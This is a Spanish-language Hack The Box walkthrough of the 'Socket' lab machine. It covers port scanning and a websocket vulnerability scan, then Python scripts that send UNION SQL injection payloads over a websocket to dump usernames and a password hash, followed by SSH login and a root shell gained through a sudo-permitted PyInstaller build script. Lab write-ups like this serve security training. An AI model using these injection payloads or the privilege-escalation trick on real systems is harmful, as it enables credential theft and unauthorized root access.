---
layout: post
title: Socket Hackthebox
---

# Writeup
![HTB]({{'/assets/img/Socket/icon-socket.png' | relative_url}})

HACK-THE-BOX

----------------------------------------------------------------------------------------------

Iniciamos el escaneo de la maquina

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.206 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 01:11 CEST
Failed to resolve "allPorts".
Failed to resolve "allPorts".
Initiating SYN Stealth Scan at 01:11
Scanning 10.10.11.206 [65535 ports]
Discovered open port 80/tcp on 10.10.11.206
Discovered open port 22/tcp on 10.10.11.206
Discovered open port 5789/tcp on 10.10.11.206
Completed SYN Stealth Scan at 01:11, 12.62s elapsed (65535 total ports)
Nmap scan report for 10.10.11.206
Host is up, received user-set (0.057s latency).
Scanned at 2023-07-03 01:11:22 CEST for 13s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
5789/tcp open  unknown syn-ack ttl 63

```

Vuelvo a lanzar nmap, esta vez para el reconocimiento de los puertos reportados
en busca de versiones y vulnerabilidades.

```bash
nmap -sCV -p22,80,5789 10.10.11.206 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 01:12 CEST
Nmap scan report for 10.10.11.206
Host is up (0.051s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://qreader.htb/
5789/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Sun, 02 Jul 2023 23:14:24 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Date: Sun, 02 Jul 2023 23:14:39 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
|   SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Date: Sun, 02 Jul 2023 23:14:40 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
```
Ya se deja ver una conexion por websocket apuntando al puerto 5789, aunque primero vere la pagina por el puerto 80.
Observo que el nombre de dominio es ***qreader.htb*** asi que lo añado al */etc/hosts*.

Y nos muestra la web.
![web]({{'/assets/img/Socket/web-qreader.png' | relative_url}})

Una web que te genera codigos **QR** y veo mas a bajo que tiene el archivo descargable para versiones de Linux y Widows (descargo version linux).
Lo analizare mas a fondo y poder ver como se ejecuta.

Buscando informacin encuentro este enlace para buscar vulnerabilidades en **websocket**
[https://github.com/PalindromeLabs/STEWS](https://github.com/PalindromeLabs/STEWS)

Ejecuto el siguiente comando para ejecutar el programa e iniciar la busqueda.
```bash
❯ python3 STEWS-vuln-detect.py -1 -n -u  qreader.htb:5789
   Testing ws://qreader.htb:5789
>>>Note: ws://qreader.htb:5789 allowed http or https for origin
>>>Note: ws://qreader.htb:5789 allowed null origin
>>>Note: ws://qreader.htb:5789 allowed unusual char (possible parse error)
>>>VANILLA CSWSH DETECTED: ws://qreader.htb:5789 likely vulnerable to vanilla CSWSH (any origin)
====Full list of vulnerable URLs===
['ws://qreader.htb:5789']
['>>>VANILLA CSWSH DETECTED: ws://qreader.htb:5789 likely vulnerable to vanilla CSWSH (any origin)']
```
Parece haber encontrado una vulnerabilidad a traves del dominio y el puerto *5789*.
Encuentro mas infomacion al respecto en este ***Enlace ->***[https://book.hacktricks.xyz/pentesting-web/cross-site-websocket-hijacking-cswsh](https://book.hacktricks.xyz/pentesting-web/cross-site-websocket-hijacking-cswsh)

Paralelamente me descargo el archivo que proporciona la web **qreader** y lo examino.
```bash
app
├── qreader
└── test.png
```
Para manipular el archivo y transformalo a ***.pyc*** encontre este ***Enalce ->***
[https://pypi.org/project/pydumpck/](https://pypi.org/project/pydumpck/)

Una vez tengamos el archivo, se descomprime todo en una carpeta, ahi encontramos *qreader.pyc* que para poder examinarlo
tendremos que pasarlo a *archivo .py* para ello encontre ***pydumpck*** [https://pypi.org/project/pydumpck/](https://pypi.org/project/pydumpck/)

Ya, una vez completado el proceso crea otro direcorio, donde se encuentra el archivo que podemos examinar en formato *.py*

***(parte del Script)***
![script]({{'/assets/img/Socket/script.png' | relative_url}})

Aqui podemos encontrar algo interesante, podriamos intentar validar y enviar una ijeccion *SQL* a traves de **websocket**

Procedo a escribir un pequeño script en python para entablar una conexion websocket y mandar la injeccion.

```python
#!/usr/bin/python3
from websocket import create_connection
import json

ws_host = 'ws://qreader.htb:5789'
VERSION = '0.0.3" UNION SELECT "test","2","3","4" FROM answers;-- -'
ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()
```
```bash
❯ python3 username.py
{"message": {"id": "test", "version": "2", "released_date": "3", "downloads": "4"}}
```
Como se puede ver en el resultado, logramos ijentar lo comando *SQL*, habra que segir investigando.

```python
#!/usr/bin/python3
from websocket import create_connection
import json

ws_host = 'ws://qreader.htb:5789'
VERSION = '0.0.3" UNION SELECT group_concat(answer),"2","3","4" FROM answers;-- -'
ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()
```
```bash
❯ python3 username.py
{"message": {"id": "Hello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller,Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller", "version": "2", "released_date": "3", "downloads": "4"}}
```
Y puuedo encontar un menseje con posibles nombres de usuasios.

```python
#!/usr/bin/python3
from websocket import create_connection
import json

ws_host = 'ws://qreader.htb:5789'
VERSION = '0.0.3" UNION SELECT username,password,"3","4" FROM users;-- -'
ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()
```
```bash
❯ python3 username.py
{"message": {"id": "admin", "version": "0c090c365fa0559b151a43e0fea39710", "released_date": "3", "downloads": "4"}}
```
Buscado mas profundamente logre encontrar una contraseña en forma de *hash* que decondeare via web.
![hash]({{'/assets/img/Socket/hash.png' | relative_url}})ç

Nos da una contraseña, que probare por ssh por el puerto 22, que vi en el reporte de **nmap**

```bash
❯ ssh tkeller@10.10.11.206
The authenticity of host '10.10.11.206 (10.10.11.206)' can't be established.
ECDSA key fingerprint is SHA256:2IX4mncu1XcUcTBw8Aa8kcZWxeVixqXf/qpnyptPp/s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.206' (ECDSA) to the list of known hosts.
tkeller@10.10.11.206's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64)

tkeller@socket:~$ whoami
tkeller
tkeller@socket:~$ hostname -I
10.10.11.206 dead:beef::250:56ff:feb9:1cb0 
tkeller@socket:~$ ls
user.txt
tkeller@socket:~$ cat user.txt 
907**************************27a
tkeller@socket:~$ 
```
Tenemos conexion y podemos visualizar la **Flag** de bajos privilegios.

```bash
tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
```
A continuacion con el comando **sudo -l** se puede ver que podemos ejecutar el escript indicado con privilegios de **root**
Despues de analizarlo, con un simple comando **echo** con una sentecia en **python** copiamos **/bin/bash** a un archivo con extension **.spec** 
Y consecutivamente ejecutamos el *script con privilegios de root*, para hacer un build al archivo que henmos creado, y nos da por consiguiente una *shell bash* con privilegios de **root**

```bash
tkeller@socket:/tmp$ echo 'import os;os.system("/bin/bash")' > root.spec

tkeller@socket:/tmp$ sudo /usr/local/sbin/build-installer.sh build root.spec 

550 INFO: PyInstaller: 5.6.2
551 INFO: Python: 3.10.6
554 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
559 INFO: UPX is not available.

root@socket:/tmp# whoami
root

root@socket:/tmp# cat ~/root.txt 
a1b**************************3c7
```
Con todo esto, ya podemos visualizar la **Flag de root**.

# Espro que te pueda servir de ayuda. *GRACIAS por venir*


